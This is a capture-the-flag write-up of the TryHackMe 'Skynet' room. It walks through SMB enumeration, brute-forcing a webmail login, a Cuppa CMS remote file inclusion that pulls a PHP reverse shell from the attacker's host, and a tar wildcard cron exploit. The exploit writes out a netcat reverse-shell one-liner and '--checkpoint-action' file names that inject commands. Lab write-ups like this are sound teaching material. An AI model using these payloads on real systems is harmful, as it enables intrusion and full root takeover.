### Overview

[Skynet](https://tryhackme.com/room/skynet) is a easy rated CTF room on [TryHackMe](https://tryhackme.com). 

> Are you able to compromise this Terminator themed machine?

### Nmap

I deployed the machine and was given the target IP 10.10.120.207. I started a NMAP scan to check the available ports.

### Enumeration

A few ports to review but I started with SMB because typically in CTF's you can find anonymous access to share which provide hints or files required on other ports. Using smbmap I found one accessible share called anonymous.

```highlight

```

Using smbclient I was able to connect to the share and found a text file and a folder of logs files. I downloaded all the files to my machine.

```highlight

The attention.txt file is a note:

"A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson"

However log1.txt looks to be a password list. log2 and log3 are empty. I moved on to start enumerating the website.

![webpage](/assets/images/skynet/webpage.png)

Nothing to note on the page or in the page source so I ran a gobuster.

/squirrelmail brings to me to a login page.

![squirrelmail](/assets/images/skynet/squirrelmail.png)

Using Burp intruder I was able to find the login details for Miles. I created a username file with the following entries:

- miles
- mdyson
- milesdyson
- milesd

Using this list of usernames and the passwords found in log1.txt I was able to access the email account.

![emails](/assets/images/skynet/emails.png)

One of the emails is miles new SMB password.

"We have changed your smb password after system malfunction.
Password: )s{A&2Z{REDACTED}"

Going back to smbclient I tried to connect to the SMB share milesdyson with the new password and got in.

Only really one file of interest /notes/important.txt

```highlight
└──╼ $cat important.txt 

1. Add features to beta CMS /45kra2{REDACTED}
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

A new cms directory to probe, looking at the page it appears to be a blog page for Miles.

![miles](/assets/images/skynet/miles.png)

Running gobuster again against the directory reveals a administrator page.

### Initial Access

Going to http://10.10.120.207/45kra2{REDACTED}/administrator/ takes us to a login page for Cuppa CMS. A quick Google reveals the [exploit](https://www.exploit-db.com/exploits/25971) which provides and local and remote file inclusion. 

Looking at the exploit we can simply request a URL with our shell code location. We can use this to get a reverse shell payload from our machine and then execute.

> http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?

On my machine I copied /usr/share/webshells/php/php-reverse-shell.php to my working directory and renamed it to shell.php, I updated the configuration to include my VPN IP and port 4444.

Then using python3 I started a http server to host the reverse shell payload and started a netcat listener on port 4444. In my browser I entered:

http://10.10.120.207/45kra2{REDACTED}/administrator/alerts/alertConfigField.php?urlConfig=http://{{ATTACKIP}}/shell.php

```highlight
└──╼ $sudo python3 -m http.server 80

10.10.120.207 - - [24/Jan/2021 16:57:15] "GET /shell.php HTTP/1.0" 200 -  
```

On my netcat listener I get a response and got a shell as 'www-data'.

```highlight

```

### Priv Esc

Looking at the file system there are two files backup.sh and backup.tgz both owned by root.

```highlight
drwxr-xr-x 2 root       root       4.0K Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson 4.0K Sep 17  2019 ..
-rwxr-xr-x 1 root       root         74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4.5M Jan 24 10:59 backup.tgz
```

The script is really simple, just creating a backup tar file or /var/www/html.

```highlight
$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

However because the tar command is using * which is a wild card and it appears the script is being run by root as a cron job we can exploit this to get a reverse shell. This [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) explains it in detail.

I following the same steps in the article and set my port to 5555 as already have a shell on port 4444.

```highlight
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ATTACKIP}} 5555 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```

Now just wait for a minute and we now have a root shell!

Thanks for reading!
